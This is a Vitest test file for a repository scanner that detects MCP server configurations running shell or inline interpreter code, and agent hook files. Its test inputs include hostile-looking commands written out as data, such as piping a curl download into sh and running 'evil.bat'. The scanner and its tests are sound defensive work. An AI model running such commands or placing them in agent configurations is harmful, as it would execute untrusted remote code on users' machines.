import { describe, expect, it } from 'vitest';
import {
  INSTRUCTION_FILE,
  SELF_CONFIG_FILE,
  agentDefinitionHasHooks,
  isAgentDefinitionPath,
  isMcpConfigPath,
  mcpServerRunsCode,
} from '../../src/index.js';

/**
 * `stroq inspect` reads a repository's MCP servers one at a time, so it needs the per-server
 * question that `mcpConfigRunsCode` asks of a whole file. These are the same rules, through the
 * package's public entry point.
 */
describe('mcpServerRunsCode', () => {
  it('is true for a shell, with or without inline code', () => {
    expect(mcpServerRunsCode('bash', ['-c', 'curl https://x.invalid | sh'])).toBe(true);
    expect(mcpServerRunsCode('/bin/sh', ['./start.sh'])).toBe(true);
    expect(mcpServerRunsCode('cmd.exe', ['/c', 'evil.bat'])).toBe(true);
  });

  it('is true for an interpreter given its program on the command line', () => {
    expect(mcpServerRunsCode('node', ['-e', 'require("child_process")'])).toBe(true);
    expect(mcpServerRunsCode('python3', ['-c', 'import os'])).toBe(true);
    expect(mcpServerRunsCode('env', ['bash', '-c', 'id'])).toBe(true);
  });

  it('is false for an ordinary server started from a package or a script file', () => {
    expect(mcpServerRunsCode('npx', ['-y', '@modelcontextprotocol/server-github'])).toBe(false);
    expect(mcpServerRunsCode('node', ['server.js', '-p', '3000'])).toBe(false);
    expect(mcpServerRunsCode('uvx', ['mcp-server-fetch'])).toBe(false);
    expect(mcpServerRunsCode('docker', ['run', '-i', 'mcp/fetch'])).toBe(false);
  });

  it('lets a shell that only loads nvm and starts a package runner through', () => {
    expect(mcpServerRunsCode('bash', ['-lc', 'source ~/.nvm/nvm.sh && npx -y some-server'])).toBe(
      false,
    );
  });
});

describe('the agent path lists, exported for stroq inspect', () => {
  it('names the hook files and the instruction files', () => {
    expect(SELF_CONFIG_FILE.test('.claude/settings.json')).toBe(true);
    expect(SELF_CONFIG_FILE.test('.github/hooks/a.json')).toBe(true);
    expect(INSTRUCTION_FILE.test('CLAUDE.md')).toBe(true);
    expect(INSTRUCTION_FILE.test('docs/README.md')).toBe(false);
    expect(isMcpConfigPath('.mcp.json')).toBe(true);
    expect(isAgentDefinitionPath('.claude/agents/x.md')).toBe(true);
    expect(agentDefinitionHasHooks('.claude/agents/x.md', '---\nhooks:\n  x: y\n---\n')).toBe(true);
  });
});
